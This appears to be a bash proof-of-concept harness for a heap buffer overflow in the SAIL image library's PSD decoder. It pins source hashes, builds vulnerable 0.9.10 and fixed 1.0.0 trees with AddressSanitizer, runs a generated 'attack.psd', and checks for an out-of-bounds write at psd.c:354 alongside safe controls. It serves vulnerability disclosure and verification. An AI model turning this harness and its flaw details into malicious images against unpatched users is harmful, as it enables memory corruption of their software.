#!/usr/bin/env bash
# sailpsd2shell: real SAIL 0.9.10 / 1.0.0 PSD codec, driven through the
# public sail_load_from_file() API. All inputs are local files.
set -u
cd "$(dirname "$0")"
ROOT="$PWD"
mkdir -p evidence pins stubs/libavutil stubs/libswscale

pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
need() { grep -Fq -- "$2" "$1" 2>/dev/null; }

echo "== pin verification =="
for pair in \
 "src-v0.9.10.tar.gz dc0d6fa87cb4fa8b514f450a3fb13cee6e3e60f03250f683564fabbec0f722e3" \
 "src-v1.0.0.tar.gz b6f77d6d451b72202c8e11bd5057b697a21f7b6c4ef713f19a96de5a16c08916" \
 "pinned/psd-v0.9.10.c 9d661a5769e17028075013649de8de7a15cd3f9ca7cd67e92fcff68a7d1d3627" \
 "pinned/psd-helpers-v0.9.10.c 789ac9b15b9f10d551ac5dc3f98fdf5341d50c3b6dc85323adcbe2be405920b4" \
 "pinned/psd-helpers-fix-parent.c 23362356da6c75b4c0c65368fd8181d9190f7eedb7ec2460b9af2755c6367501" \
 "pinned/psd-helpers-fix.c f3f7f3fd5a1b071a3eef8349f56c1aa128c88a8ec0d44cdccf021b5c407c017d" \
 "pinned/psd-v1.0.0.c 33905062c111999ce39b0677ef5a7613980a540fbe3e87ee51da854086eec588" \
 "pinned/psd-helpers-v1.0.0.c f3f7f3fd5a1b071a3eef8349f56c1aa128c88a8ec0d44cdccf021b5c407c017d" \
 "driver.c 034c859db4acd1ca387baf8857099e0cb42b89845a10ea5e12f3cab39e876d22" \
 "make-poc.py 73d4d7c4bab0ace8b9db983b301fa805d64109d6fedecb61bfb92146af872fe3" \
 "stubs/libavutil/pixfmt.h b452ef37e3308339924e62eadf0ce7d4674732953927f745423b10ab60dd422e" \
 "stubs/libswscale/swscale.h b452ef37e3308339924e62eadf0ce7d4674732953927f745423b10ab60dd422e"; do
    set -- $pair
    got=$(sha256sum "$1" | cut -d' ' -f1)
    [ "$got" = "$2" ] && ok "pin $1" || bad "pin $1 ($got != $2)"
done

echo "== extract and verify source mechanism =="
[ -f sail-0.9.10/CMakeLists.txt ] || tar -xzf src-v0.9.10.tar.gz
[ -f sail-1.0.0/CMakeLists.txt ] || tar -xzf src-v1.0.0.tar.gz
for pair in \
 "pinned/psd-v0.9.10.c sail-0.9.10/src/sail-codecs/psd/psd.c" \
 "pinned/psd-helpers-v0.9.10.c sail-0.9.10/src/sail-codecs/psd/helpers.c" \
 "pinned/psd-v1.0.0.c sail-1.0.0/src/sail-codecs/psd/psd.c" \
 "pinned/psd-helpers-v1.0.0.c sail-1.0.0/src/sail-codecs/psd/helpers.c"; do
    set -- $pair
    cmp -s "$1" "$2" && ok "source $2" || bad "source $2"
done
if need pinned/psd-helpers-v0.9.10.c 'case 1: *result = SAIL_PIXEL_FORMAT_BPP1_INDEXED; return SAIL_OK;' \
   && need pinned/psd-v0.9.10.c '*(scan + channel)   = *(psd_state->scan_buffer + pixel);'; then
    ok "v0.9.10 Bitmap ignores depth and writes one byte per pixel"
else
    bad "v0.9.10 Bitmap ignores depth and writes one byte per pixel"
fi
if need pinned/psd-helpers-fix.c 'case 1: *result = SAIL_PIXEL_FORMAT_BPP1_INDEXED; return SAIL_OK;' \
   && ! cmp -s pinned/psd-helpers-fix-parent.c pinned/psd-helpers-fix.c; then
    ok "fix rejects Bitmap/indexed depth mismatches"
else
    bad "fix rejects Bitmap/indexed depth mismatches"
fi
(diff -u pinned/psd-helpers-fix-parent.c pinned/psd-helpers-fix.c > evidence/vendor-fix.diff 2>&1 || true)

echo "== generate inputs =="
python3 make-poc.py evidence && ok "generate PSD inputs" || bad "generate PSD inputs"
[ "$(wc -c < evidence/attack.psd)" -eq 104 ] && ok "attack.psd is 104 bytes" || bad "attack.psd is 104 bytes"
[ "$(wc -c < evidence/safe-depth1.psd)" -eq 48 ] && ok "safe-depth1.psd is 48 bytes" || bad "safe-depth1.psd is 48 bytes"

[ "$(sha256sum evidence/attack.psd | cut -d' ' -f1)" = 313b5a92436ab4f1ea66e64a2ab98734252a32be7dda4cd1be158c76c7326cd9 ] && ok "attack.psd exact bytes" || bad "attack.psd exact bytes"
[ "$(sha256sum evidence/safe-depth1.psd | cut -d' ' -f1)" = a3c07560cfd8c693b68ad55602d425fed9dff80c3559ec5c8124bceaadf093ed ] && ok "safe-depth1.psd exact bytes" || bad "safe-depth1.psd exact bytes"
echo "== build real static SAIL trees =="
build_tree() {
    tag=$1; src=$2; cc=$3; mode=$4
    if [ "$mode" = asan ]; then
        cflags="-fsanitize=address -fno-omit-frame-pointer -g -O0"; ldflags="-fsanitize=address"
    else
        cflags="-g -O0"; ldflags=""
    fi
    [ "$src" = sail-1.0.0 ] && cflags="$cflags -I$ROOT/stubs"
    timeout 120 cmake -S "$src" -B "build-$tag" -G Ninja \
        -DBUILD_SHARED_LIBS=OFF -DSAIL_ONLY_CODECS=psd \
        -DSAIL_BUILD_APPS=OFF -DSAIL_BUILD_EXAMPLES=OFF \
        -DSAIL_BUILD_BINDINGS=OFF -DBUILD_TESTING=OFF \
        -DSAIL_MANIP_USE_SWSCALE=OFF -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_COMPILER="$cc" -DCMAKE_C_FLAGS="$cflags" \
        -DCMAKE_EXE_LINKER_FLAGS="$ldflags" > "evidence/configure-$tag.log" 2>&1 \
        && timeout 180 cmake --build "build-$tag" -j4 > "evidence/build-$tag.log" 2>&1
}
compile_driver() {
    tag=$1; src=$2; cc=$3; mode=$4
    if [ "$mode" = asan ]; then
        cflags="-fsanitize=address -fno-omit-frame-pointer -g -O0"
        ldflags="-fsanitize=address"
    else
        cflags="-g -O0"; ldflags=""
    fi
    [ "$src" = sail-1.0.0 ] && cflags="$cflags -I$ROOT/stubs"
    $cc $cflags -I "$src/src" -I "build-$tag/include" driver.c \
        -Wl,--start-group build-$tag/src/sail/libsail.a \
        build-$tag/src/sail-codecs-archive/libsail-codecs.a \
        build-$tag/src/sail-common/libsail-common.a \
        build-$tag/src/sail-manip/libsail-manip.a -Wl,--end-group \
        -lm $ldflags -o "evidence/$tag-bin" 2> "evidence/compile-$tag.log"
}
for spec in 'vuln-gcc-asan sail-0.9.10 gcc asan' 'vuln-clang-asan sail-0.9.10 clang asan' 'vuln-plain sail-0.9.10 gcc plain' 'fixed-asan sail-1.0.0 clang asan' 'fixed-plain sail-1.0.0 gcc plain'; do
    set -- $spec
    build_tree "$1" "$2" "$3" "$4" && compile_driver "$1" "$2" "$3" "$4" \
        && ok "build $1" || bad "build $1"
done

echo "== rung 3: ASan-confirmed corruption =="
for spec in 'vuln-gcc-asan gcc' 'vuln-clang-asan clang'; do
    set -- $spec
    ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 "./evidence/$1-bin" evidence/attack.psd > "evidence/asan-$1-attack.out" 2>&1
    rc=$?
    [ "$rc" -ne 0 ] && ok "$2 ASan attack rc=$rc" || bad "$2 ASan attack exited 0"
    if need "evidence/asan-$1-attack.out" 'heap-buffer-overflow' \
       && need "evidence/asan-$1-attack.out" 'WRITE of size 1' \
       && need "evidence/asan-$1-attack.out" 'psd.c:354'; then
        ok "$2 ASan WRITE of size 1 at psd.c:354"
    else
        bad "$2 ASan WRITE of size 1 at psd.c:354"
    fi
done

echo "== controls =="
for spec in 'vuln-gcc-asan evidence/safe-depth1.psd' 'fixed-asan evidence/attack.psd' 'fixed-asan evidence/safe-depth1.psd'; do
    set -- $spec
    out="evidence/$1-$(basename "$2" .psd).out"
    ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 "./evidence/$1-bin" "$2" > "$out" 2>&1
    rc=$?
    if [ "$2" = evidence/attack.psd ]; then
        [ "$rc" -ne 0 ] && ok "$1 rejects attack rc=$rc" || bad "$1 accepted attack"
    else
        [ "$rc" -eq 0 ] && ok "$1 safe control rc=0" || bad "$1 safe control rc=$rc"
    fi
    if need "$out" 'ERROR: AddressSanitizer'; then bad "$1 control ASan hit"; else ok "$1 control ASan clean"; fi
done
for spec in 'vuln-plain evidence/attack.psd' 'vuln-plain evidence/safe-depth1.psd' 'fixed-plain evidence/attack.psd' 'fixed-plain evidence/safe-depth1.psd'; do
    set -- $spec
    out="evidence/$1-$(basename "$2" .psd).out"
    "./evidence/$1-bin" "$2" > "$out" 2>&1
    rc=$?
    if [ "$1" = fixed-plain ] && [ "$2" = evidence/attack.psd ]; then
        [ "$rc" -ne 0 ] && ok "fixed plain rejects attack rc=$rc" || bad "fixed plain accepted attack"
    else
        [ "$rc" -eq 0 ] && ok "$1 $(basename "$2") rc=0" || bad "$1 $(basename "$2") rc=$rc"
    fi
done

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
